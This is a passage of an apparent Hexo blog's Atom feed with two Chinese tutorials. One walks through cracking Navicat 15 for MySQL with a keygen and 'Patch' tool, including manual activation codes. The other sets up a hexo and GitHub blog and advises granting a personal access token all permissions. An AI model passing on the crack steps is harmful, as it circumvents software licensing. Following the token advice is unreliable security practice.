&lt;h1 id=&quot;自己电脑上的项目如何让别人访问&quot;&gt;&lt;a href=&quot;#自己电脑上的项目如何让别人访问&quot; class=&quot;headerlink&quot; title=&quot;自己电脑上的项目如何让别人访问&quot;&gt;&lt;/a&gt;自己电脑上的项目如何让别人访问&lt;/h1&gt;&lt;p&gt;一般自己在电脑</summary>
      
    
    
    
    
    <category term="教学" scheme="http://zhizhi111.github.io/tags/%E6%95%99%E5%AD%A6/"/>
    
    <category term="Ngork" scheme="http://zhizhi111.github.io/tags/Ngork/"/>
    
  </entry>
  
  <entry>
    <title>Navivat 15 for Mysql的安装破解教程</title>
    <link href="http://zhizhi111.github.io/2021/12/21/Navivat%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%A0%B4%E8%A7%A3%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <id>http://zhizhi111.github.io/2021/12/21/Navivat%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%A0%B4%E8%A7%A3%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</id>
    <published>2021-12-21T13:50:56.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>tips：不废话,直接上手。</p><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><h3 id="1-下载Navicat-15-X-for-Mysql"><a href="#1-下载Navicat-15-X-for-Mysql" class="headerlink" title="1.下载Navicat 15.X for Mysql."></a>1.下载Navicat 15.X for Mysql.</h3><p>(Navicat 15.x for MySQ可以直接到官网去下载。安装时选择安装文件夹，无脑下一步即可）</p><h3 id="2-下载注册机。"><a href="#2-下载注册机。" class="headerlink" title="2.下载注册机。"></a>2.下载注册机。</h3><p><img src="https://img-blog.csdnimg.cn/c787babfc81540efadf2e675b407f1af.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_19,color_FFFFFF,t_70,g_se,x_16" alt="破解机"></p><h4 id="3-没有navicat注册机的小伙伴可以关注私聊，免费提供。"><a href="#3-没有navicat注册机的小伙伴可以关注私聊，免费提供。" class="headerlink" title="3.没有navicat注册机的小伙伴可以关注私聊，免费提供。"></a>3.没有navicat注册机的小伙伴可以关注私聊，免费提供。</h4><h1 id="二、安装过程"><a href="#二、安装过程" class="headerlink" title="二、安装过程"></a>二、安装过程</h1><h3 id="第一步、将下载好的注册机复制到Navicat-15-x-for-MySQL的安装目录；"><a href="#第一步、将下载好的注册机复制到Navicat-15-x-for-MySQL的安装目录；" class="headerlink" title="第一步、将下载好的注册机复制到Navicat 15.x for MySQL的安装目录；"></a>第一步、将下载好的注册机复制到Navicat 15.x for MySQL的安装目录；</h3><p>我是安装在默认的文件夹 C:\Program Files\PremiumSoft\Navicat 15 for MySQL中，只要将上图中“Navicat破解注册机”复制到这个目录中即可,</p><p><img src="https://img-blog.csdnimg.cn/65e735058bcf4c64b085db306a4ad5fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_17,color_FFFFFF,t_70,g_se,x_16" alt="安装目录选择"></p><h3 id="第二步、双击运行注册机，如下图所示，选择-“Navicat-v15”，Products选择“MySQL”，Languages选择-“Simplified-Chinese”，然后点击“Patch”，进行注册-请按照以下图示一步一步操作"><a href="#第二步、双击运行注册机，如下图所示，选择-“Navicat-v15”，Products选择“MySQL”，Languages选择-“Simplified-Chinese”，然后点击“Patch”，进行注册-请按照以下图示一步一步操作" class="headerlink" title="第二步、双击运行注册机，如下图所示，选择 “Navicat v15”，Products选择“MySQL”，Languages选择 “Simplified Chinese”，然后点击“Patch”，进行注册,请按照以下图示一步一步操作"></a>第二步、双击运行注册机，如下图所示，选择 “Navicat v15”，Products选择“MySQL”，Languages选择 “Simplified Chinese”，然后点击“Patch”，进行注册,请按照以下图示一步一步操作</h3><p><img src="https://img-blog.csdnimg.cn/bfc0ffe75bad4ab9b5e75f2797e5098c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_15,color_FFFFFF,t_70,g_se,x_16" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/f23eddb6dc9947e88844d9f28fe1bf91.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_15,color_FFFFFF,t_70,g_se,x_16" alt="2"></p><p><img src="https://img-blog.csdnimg.cn/3236b0ab095b42baa1c2a24ab693f9ed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_15,color_FFFFFF,t_70,g_se,x_16" alt="3"></p><h3 id="第三步、打开Navicat-15-X-for-Mysql，进行注册操作，（如果第一次安装的话，打开软件就会提示注册，如果之前遗留有注册信息，可以通过点击帮助-》注册），点击注册机上的Generate生成许可证秘钥，如下图所示："><a href="#第三步、打开Navicat-15-X-for-Mysql，进行注册操作，（如果第一次安装的话，打开软件就会提示注册，如果之前遗留有注册信息，可以通过点击帮助-》注册），点击注册机上的Generate生成许可证秘钥，如下图所示：" class="headerlink" title="第三步、打开Navicat 15.X for Mysql，进行注册操作，（如果第一次安装的话，打开软件就会提示注册，如果之前遗留有注册信息，可以通过点击帮助-》注册），点击注册机上的Generate生成许可证秘钥，如下图所示："></a>第三步、打开Navicat 15.X for Mysql，进行注册操作，（如果第一次安装的话，打开软件就会提示注册，如果之前遗留有注册信息，可以通过点击帮助-》注册），点击注册机上的Generate生成许可证秘钥，如下图所示：</h3><p><img src="https://img-blog.csdnimg.cn/60c103a3bcd04cafa00c7246e4776c9e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_16,color_FFFFFF,t_70,g_se,x_16" alt="4"></p><h3 id="第四步、许可证秘钥生成后，然后将许可证秘钥复制粘贴到Navicat-15-X-for-Mysql进行注册"><a href="#第四步、许可证秘钥生成后，然后将许可证秘钥复制粘贴到Navicat-15-X-for-Mysql进行注册" class="headerlink" title="第四步、许可证秘钥生成后，然后将许可证秘钥复制粘贴到Navicat 15.X for Mysql进行注册"></a>第四步、许可证秘钥生成后，然后将许可证秘钥复制粘贴到Navicat 15.X for Mysql进行注册</h3><p><img src="https://img-blog.csdnimg.cn/afe3c0fd1b1a4de793bb515fa381b616.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="5"></p><h3 id="第五步、点击“激活”按钮，进行激活；如果激活失败，比如："><a href="#第五步、点击“激活”按钮，进行激活；如果激活失败，比如：" class="headerlink" title="第五步、点击“激活”按钮，进行激活；如果激活失败，比如："></a>第五步、点击“激活”按钮，进行激活；如果激活失败，比如：</h3><h3 id="“激活失败。原因可能是由于已达到激活次数的上限。请检查你是否已在-卸载或重新安装Navicat前取消许可证秘钥。”"><a href="#“激活失败。原因可能是由于已达到激活次数的上限。请检查你是否已在-卸载或重新安装Navicat前取消许可证秘钥。”" class="headerlink" title="“激活失败。原因可能是由于已达到激活次数的上限。请检查你是否已在 卸载或重新安装Navicat前取消许可证秘钥。”"></a>“激活失败。原因可能是由于已达到激活次数的上限。请检查你是否已在 卸载或重新安装Navicat前取消许可证秘钥。”</h3><h3 id="这时候就点击“手动激活”；然后将请求码粘贴复制到注册机的Request-Code输入框中；然后点击“Generate”，生成激活码，然后将注册机生成的激活码复制到软件的激活码框中；然后点击“激活”按钮，进行激活。"><a href="#这时候就点击“手动激活”；然后将请求码粘贴复制到注册机的Request-Code输入框中；然后点击“Generate”，生成激活码，然后将注册机生成的激活码复制到软件的激活码框中；然后点击“激活”按钮，进行激活。" class="headerlink" title="这时候就点击“手动激活”；然后将请求码粘贴复制到注册机的Request Code输入框中；然后点击“Generate”，生成激活码，然后将注册机生成的激活码复制到软件的激活码框中；然后点击“激活”按钮，进行激活。"></a>这时候就点击“手动激活”；然后将请求码粘贴复制到注册机的Request Code输入框中；然后点击“Generate”，生成激活码，然后将注册机生成的激活码复制到软件的激活码框中；然后点击“激活”按钮，进行激活。</h3><p><img src="https://img-blog.csdnimg.cn/c0f17ee7165441ed8602b2deba43cccc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_10,color_FFFFFF,t_70,g_se,x_16" alt="5"></p><p><img src="https://img-blog.csdnimg.cn/57b809b5a9df436db54f724c5cdd4111.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="6"></p><p><img src="https://img-blog.csdnimg.cn/c3a9b5b5b3e4469781c57dda299db682.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="7"></p><h3 id="点击“手动激活”后会出现如上图所示，复制粘贴请求码到注册机中的”Request-Code”中，然后点击”Activation-Code”中的”Generate”"><a href="#点击“手动激活”后会出现如上图所示，复制粘贴请求码到注册机中的”Request-Code”中，然后点击”Activation-Code”中的”Generate”" class="headerlink" title="点击“手动激活”后会出现如上图所示，复制粘贴请求码到注册机中的”Request Code”中，然后点击”Activation Code”中的”Generate”"></a>点击“手动激活”后会出现如上图所示，复制粘贴请求码到注册机中的”Request Code”中，然后点击”Activation Code”中的”Generate”</h3><p><img src="https://img-blog.csdnimg.cn/03f4226e114a4cc69bdc4d4fb1ae95b9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_15,color_FFFFFF,t_70,g_se,x_16" alt="8"></p><p><img src="https://img-blog.csdnimg.cn/4eb76e49877e4fd788b3cda0ff3a151c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="9"></p><p><img src="https://img-blog.csdnimg.cn/034a7dde8c3a43c4842c85df91d60ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rip5p-U55qE5qmZ5Y-Z54y_,size_16,color_FFFFFF,t_70,g_se,x_16" alt="10"></p><h3 id="1-提示”Navicat现已激活”，接下来就可以运行Navicat-15-X-for-Mysql，没有14天体验提示，就激活成功了！"><a href="#1-提示”Navicat现已激活”，接下来就可以运行Navicat-15-X-for-Mysql，没有14天体验提示，就激活成功了！" class="headerlink" title="1. 提示”Navicat现已激活”，接下来就可以运行Navicat 15.X for Mysql，没有14天体验提示，就激活成功了！"></a>1. 提示”Navicat现已激活”，接下来就可以运行Navicat 15.X for Mysql，没有14天体验提示，就激活成功了！</h3><h3 id="2-安装的时候顺手截图记录下来，给你们参考一下，如果你们安装过程中，遇到其他问题，欢迎一起探讨。"><a href="#2-安装的时候顺手截图记录下来，给你们参考一下，如果你们安装过程中，遇到其他问题，欢迎一起探讨。" class="headerlink" title="2. 安装的时候顺手截图记录下来，给你们参考一下，如果你们安装过程中，遇到其他问题，欢迎一起探讨。"></a>2. 安装的时候顺手截图记录下来，给你们参考一下，如果你们安装过程中，遇到其他问题，欢迎一起探讨。</h3><h3 id="3-经济条件允许的话，还是想建议你们多支持正版！！"><a href="#3-经济条件允许的话，还是想建议你们多支持正版！！" class="headerlink" title="3. 经济条件允许的话，还是想建议你们多支持正版！！"></a>3. 经济条件允许的话，还是想建议你们多支持正版！！</h3><h3 id="4-这篇教程老早就想写了，在某C站发布，涉及到版权，破解等问题，通不过审核，所以就照搬发到自己的博客上面了，到时候换电脑，换系统啥的，Navicat可视化工具必不可少呀！-qio实好用。"><a href="#4-这篇教程老早就想写了，在某C站发布，涉及到版权，破解等问题，通不过审核，所以就照搬发到自己的博客上面了，到时候换电脑，换系统啥的，Navicat可视化工具必不可少呀！-qio实好用。" class="headerlink" title="4. 这篇教程老早就想写了，在某C站发布，涉及到版权，破解等问题，通不过审核，所以就照搬发到自己的博客上面了，到时候换电脑，换系统啥的，Navicat可视化工具必不可少呀！ qio实好用。"></a>4. 这篇教程老早就想写了，在某C站发布，涉及到版权，破解等问题，通不过审核，所以就照搬发到自己的博客上面了，到时候换电脑，换系统啥的，Navicat可视化工具必不可少呀！ qio实好用。</h3><h3 id="5-大家可以移步看看我的CSDN文章！点不点赞无所谓，加点访客也挺香的，哈哈！"><a href="#5-大家可以移步看看我的CSDN文章！点不点赞无所谓，加点访客也挺香的，哈哈！" class="headerlink" title="5. 大家可以移步看看我的CSDN文章！点不点赞无所谓，加点访客也挺香的，哈哈！"></a>5. 大家可以移步看看<a href="https://blog.csdn.net/m0_62145574?spm=1001.2100.3001.5343">我的CSDN</a>文章！点不点赞无所谓，加点访客也挺香的，哈哈！</h3><h3 id="最后，感谢阅读！"><a href="#最后，感谢阅读！" class="headerlink" title="* 最后，感谢阅读！"></a>* 最后，感谢阅读！</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;tips：不废话,直接上手。&lt;/p&gt;
&lt;h1 id=&quot;一、准备工作&quot;&gt;&lt;a href=&quot;#一、准备工作&quot; class=&quot;headerlink&quot; title=&quot;一、准备工作&quot;&gt;&lt;/a&gt;一、准备工作&lt;/h1&gt;&lt;h3 id=&quot;1-下载Navicat-15-X-for-Mysql&quot;</summary>
      
    
    
    
    
    <category term="MySQL" scheme="http://zhizhi111.github.io/tags/MySQL/"/>
    
    <category term="教学" scheme="http://zhizhi111.github.io/tags/%E6%95%99%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>基于hexo+github搭建个人博客</title>
    <link href="http://zhizhi111.github.io/2021/12/18/hexo+github/"/>
    <id>http://zhizhi111.github.io/2021/12/18/hexo+github/</id>
    <published>2021-12-18T01:33:22.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>Date By: 2021-12-18 11:39:06</p><h3 id="小故事："><a href="#小故事：" class="headerlink" title="小故事："></a>小故事：</h3><blockquote><p>早晨，猫医生要去河对岸的小山村给小动物们治病。但一到河边，猫医生就傻眼了——原来，前几天连下了几场大雨，把小桥给冲走了，这可怎么过河呢?猫医生着急地想着。听到这个消息，鸭子、小马、小狗、小兔······都闻声赶来，帮猫医生过河。小马自告奋勇地说：“我来，我来，我腿长，我驮你过河!”猫医生爬上了小马的背，因为猫医生太胖，小马被压死了，全剧终…..</p></blockquote><h3 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h3><blockquote><p>When you finish reading my article teaching, you will certainly build their own independent personal blog site.<br>I will teaching you for mother’s teach hand by hand.(我将进行手把手保姆级教学)</p></blockquote><h3 id="首先你得准备node-js-、-git-、-github个人账号"><a href="#首先你得准备node-js-、-git-、-github个人账号" class="headerlink" title="首先你得准备node.js 、 git 、 github个人账号"></a>首先你得准备<code>node.js</code> 、 <code>git</code> 、 <code>github</code>个人账号</h3><p>写博客内容不寒颤的话，再装一个<code>vscode</code>，手敲<code>vim</code>命令修改文件qio实很头疼。</p><p>以管理员身份运行<code>cmd</code>检查<code>node.js</code>是否配置完成，代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>检查<code>git</code>是否配置完成，代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version </span><br></pre></td></tr></table></figure><p>主要是用到<code>hexo</code>工具，在<code>cmd</code>管理员命令窗口安装<code>hexo</code>工具，代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>检查hexo工具是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -v</span><br></pre></td></tr></table></figure><p>检查node.js下的一款安装工具npm是否配置完成，代码如下(安装完node基本就能查出版本号)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm -v</span><br></pre></td></tr></table></figure><p>我检查如下：<br><img src="https://s2.loli.net/2021/12/28/d5FRZVTW1Cst4Nz.png" alt="21.png"></p><p>此时工具的准备工作完成啦！！！</p><h3 id="第一步：搭建仓库"><a href="#第一步：搭建仓库" class="headerlink" title="第一步：搭建仓库"></a>第一步：搭建仓库</h3><p><code>github</code>网页注册账号，自行创建一个<code>respository</code>，注意：仓库名为<code>github账户名+.github.io</code><br>在b站搜索<code>github</code>创建仓库教学，一抓一大把，这里不做缀叙，以我的为例，仓库名是：1760317896.github.io<br><code>github</code>仓库作用就是充当远程服务器，存储我们的博客文件，让所有人可以去访问。</p><h3 id="第二步：生成SSH-Keys"><a href="#第二步：生成SSH-Keys" class="headerlink" title="第二步：生成SSH Keys"></a>第二步：生成<code>SSH Keys</code></h3><p>随便进入一个文件夹当中，随便进，不要管，因为生成SSH秘钥跟你在哪个文件下操作没有关系。一定要在文件夹里面右击选择git bash打开git命令窗口，直接敲如下代码</p><p>注意：双引号下面的是你的<code>github</code>注册的邮件地址，自行修改，github的账户名跟邮箱号很重要！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;1760317896@qq.com&quot;</span></span><br></pre></td></tr></table></figure><p>敲完按四次回车，这时命令就会在电脑本地新建一个文件夹，文件夹默认在C盘下面的users/administrator/.ssh文件<br>打开<code>ssh</code>文件，会生成两个文件，分别是 <code>id_rsa</code> 和 <code>id_rsa.pud</code>  两个文件<br>点开 <code>id_rsa.pud</code> 文件，复制出秘钥，点开<code>github</code>网页的个人头像的<code>settings</code>，点到<code>SSH and GPG keys</code>，新建一个秘钥，秘钥的title随便取名，秘钥粘贴上去，点击 <code>Add SSH Key</code> 就创建成功了！</p><p>然后要确定我们是否绑定成功，回到刚才那个git命令窗口，输入以下命令，不需修改，照着输入即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh  -T git@github.com  //测试ssh是否绑定成功</span><br></pre></td></tr></table></figure><p>输入命令敲回车，窗口会询问<code>yes / no[fingerprint]?</code>，不用担心，手敲yes，回车即可。<br>出现successfuly authenticated 就表示绑定<code>SSH</code>成功！</p><h3 id="第三步，生成hexo文件"><a href="#第三步，生成hexo文件" class="headerlink" title="第三步，生成hexo文件"></a>第三步，生成hexo文件</h3><p>新建一个文件夹，文件夹名字随意取，在哪个盘新建都行，你记得地址就行，以后这就作为你博客项目的本地文件夹了，新建完成是一个空的文件夹，点进去，右击选择<code>git bash</code>，敲以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init //初始化hexo，成功后会发现文件夹多了好多文件，就是hexo文件,可能会出现链接超时的情况</span><br></pre></td></tr></table></figure><p>过程中可能会出现连接失败的情况，不要紧，因为<code>github</code>是国外的网站，链接不稳定，再次敲相同代码重试即可。一般第二次第三次就可以初始化啦！</p><p>初始化成功会提示：start blogging with Hexo！且发现文件夹多出好多文件，继续敲命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s     <span class="comment">#静态生成本地的hexo页面</span></span><br></pre></td></tr></table></figure><p><code>hexo s</code>命令敲完回车就会有一个本地的访问地址，比如我的出现的是<a href="http://localhost:4000/%EF%BC%8C%E5%A4%8D%E5%88%B6%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%95%A6">http://localhost:4000/，复制地址，就可以访问啦</a><br>(复制的时候不要<code>Ctrl+C</code>,这是停掉本地生成页面服务的快捷键,你需要选中右击点击Copy,当然如果你手速较快，已经停止服务了，页面显示404错误，问题不大，重新输入<code>hexo s</code>即可)</p><p>此时本地的博客搭建完成！本地搭建完成剩下就是发布到<code>github</code>服务器。</p><blockquote><p>如果hexo s命令没有运行成功的话，那就是没装服务的原因，在git面板输入以下命令:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo server   <span class="comment">#装server服务，再运行hexo server或者hexo s就可以了。</span></span><br></pre></td></tr></table></figure><p>顺带把hexo deploy的依赖包也装上吧，代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save  </span><br></pre></td></tr></table></figure><h3 id="第四步，将本地博客项目上传到github仓库。"><a href="#第四步，将本地博客项目上传到github仓库。" class="headerlink" title="第四步，将本地博客项目上传到github仓库。"></a>第四步，将本地博客项目上传到github仓库。</h3><p>在生成的<code>hexo</code>众多文件里面，找到 <code>_config.yml</code>文件，直接在文件夹中打开编辑也行，在<code>git bash</code>命令窗口敲<code>vim</code>命令也行,当然这需要你有Linux命令基础，我建议直接在文件夹点开编辑就好，打开方式选记事本，vscode打开都可。<br>修改 <code>_config.yml</code>文件夹的deploy，修改为以下内容:(直接拉到最下面)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository： <span class="built_in">clone</span>仓库地址     <span class="comment">#仓库http地址，clone出来，加上.git</span></span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>注意：冒号<code>：</code>后面必须输入一个空格。<br>      冒号<code>：</code>后面必须输入一个空格。<br>      冒号<code>：</code>后面必须输入一个空格。<br><code>clone</code>仓库地址： 就是你在<code>github上面新建仓库的网址+.git</code>。仓库url复制克隆出来大家都会吧，不会的自行百度，很简单的。<br><code>type</code> 和 <code>branch</code> 两个参数的值都是一样的，大家自行照抄就好啦。</p><p>修改完成就进行一下操作</p><p>在<code>hexo</code>项目的文件夹，右击选择 <code>git bash</code>, 输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g   <span class="comment">#生成页面的命令</span></span><br></pre></td></tr></table></figure><p>生成页面命令敲完回车等待完成，继续输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d  <span class="comment">#上传到github 的命令 这是最关键的一步</span></span><br></pre></td></tr></table></figure><p>输入完hexo d敲回车，会验证你的github账号，出来一个小输入框，要求输入你的username，输入github用户名即可。<br>用户名输完会马上要求输入密码</p><p>注意！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><p>此时要求输入的密码并非github登录密码!!!<br>此时要求输入的密码并非github登录密码!!!<br>此时要求输入的密码并非github登录密码!!!</p><p>密码先不要急着输入，小输入框拉到一边，</p><p>我们回到<code>github</code>网页</p><p>点击到<code>github</code>网页，点击头像的<code>Settings</code>，点击<code>Developr Settings</code>，点击<code>Personal access tokens</code></p><p>添加一个令牌，令牌名字随便取，令牌的权限建议全部勾选，影响不大，然后点击下面的generate token</p><p>就会出现令牌，很长，复制粘贴是不行的，必须纯手打进那个小输入框，自行手动输入。</p><p>注意：令牌很重要！！！<br>     令牌很重要！！！<br>     令牌很重要！！！<br>一定要把令牌复制出来放到一个记事本或者文档里面，离开页面以后就再也查看不到令牌了，这也是github出于安全性能方面，2021年的大更新，所以令牌要复制出来保存好。下次再发布到github上时还是需要纯手打输入令牌。（肠子都悔青了，令牌自己都忘记复制出来了）。</p><p>令牌手打输入到小输入框内，点击OK，此时就会将本地的<code>hexo</code>项目全部上传至<code>github</code>仓库，回到<code>github</code>仓库即可查看。</p><h3 id="如果输入-hexo-d-出现以下错误："><a href="#如果输入-hexo-d-出现以下错误：" class="headerlink" title="如果输入 hexo d 出现以下错误："></a>如果输入 <code>hexo d</code> 出现以下错误：</h3><p>fatal: unable to auto-detect email address (got ‘z@DESKTOP-DPE3A08.(none)’)<br>error: src refspec HEAD does not match any<br>error: failed to push some refs to ‘<a href="https://github.com/seekwhale13/seekwhale13.ithub.io.git&#39;">https://github.com/seekwhale13/seekwhale13.ithub.io.git&#39;</a></p><h3 id="可以先运行以下代码："><a href="#可以先运行以下代码：" class="headerlink" title="可以先运行以下代码："></a>可以先运行以下代码：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;你的邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;你的gihub名字&quot;</span>  <span class="comment">#注意有两个`-`</span></span><br></pre></td></tr></table></figure><p>例如我上传失败，输入以下命令回车，然后重新上传(hexo deploy)即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;1760317896@qq.com&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;ha1357&quot;</span></span><br></pre></td></tr></table></figure><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://www.bilibili.com/">哔哩哔哩</a> 众所周知，b站是学习网站</p><p><a href="https://www.baidu.com/">百度</a>  不懂就问度娘，自行搜索</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>芜湖！！ 结束了，昨天下午弄了两个小时把个人博客搭建完成，一步一步来，基本没有什么错误，<code>hexo+github</code>搭建个人博客还是比较简单的，如果你搭建的过程中遇到什么问题可以提出来，大家一起交流交流，仓库名就是我的QQ号，欢迎添加。<br>虽然这个教学有点抽象，没有图片支撑相应的步骤具体操作，但是大家将就着看吧，昨天搭建的时候属实是忘记截图了。有时间出一个视频教学。昨晚在b站看到一个也是比较流行的个人博客框架，基于GO语言的hugo博客框架，搭建起来比hexo操作更简单，hexo搭建失败的小伙伴，可以去试试hugo。<a href="https://www.bilibili.com/video/BV1q4411i7gL">hugo搭建教学直达</a>。博客主题，博客内容大家自行修改，网上也有很多教学。推荐<a href="https://space.bilibili.com/384068749?spm_id_from=333.788.b_765f7570696e666f.1">CodeSheep</a>这位娘心up主。也能会有小伙伴说，这搭建起来太简单了，有没有稍微难一点的，那是当然啦。你可以试试现Halo，Halo 是一款现代化的个人独立博客系统，给习惯写博客的同学多一个选择。大家搜Halo官网就会有官方文档，有具体部署教学，我大概看了一下官网的主题库，简直是太多、太好看、太个性化了！部署起来也会比较复杂，准备搭建的小伙伴需要准备一个云服务器，服务器管理软件堡塔面板，安装docker工具等等，详细教学可以参照参考文献自行搜索。</p><blockquote><h4 id="本文首次发布于2021年12月18号，转载请说明出处并附上本站网址！感谢。"><a href="#本文首次发布于2021年12月18号，转载请说明出处并附上本站网址！感谢。" class="headerlink" title="本文首次发布于2021年12月18号，转载请说明出处并附上本站网址！感谢。"></a>本文首次发布于2021年12月18号，转载请说明出处并附上本站网址！感谢。</h4></blockquote><h3 id="最后，感谢阅读。"><a href="#最后，感谢阅读。" class="headerlink" title="最后，感谢阅读。"></a>最后，感谢阅读。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Date By: 2021-12-18 11:39:06&lt;/p&gt;
&lt;h3 id=&quot;小故事：&quot;&gt;&lt;a href=&quot;#小故事：&quot; class=&quot;headerlink&quot; title=&quot;小故事：&quot;&gt;&lt;/a&gt;小故事：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;早晨，猫医生要去河对岸的小</summary>
      
    
    
    
    
    <category term="教学" scheme="http://zhizhi111.github.io/tags/%E6%95%99%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>前言：搭建成功</title>
    <link href="http://zhizhi111.github.io/2021/12/17/hello-world/"/>
    <id>http://zhizhi111.github.io/2021/12/17/hello-world/</id>
    <published>2021-12-17T09:50:20.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
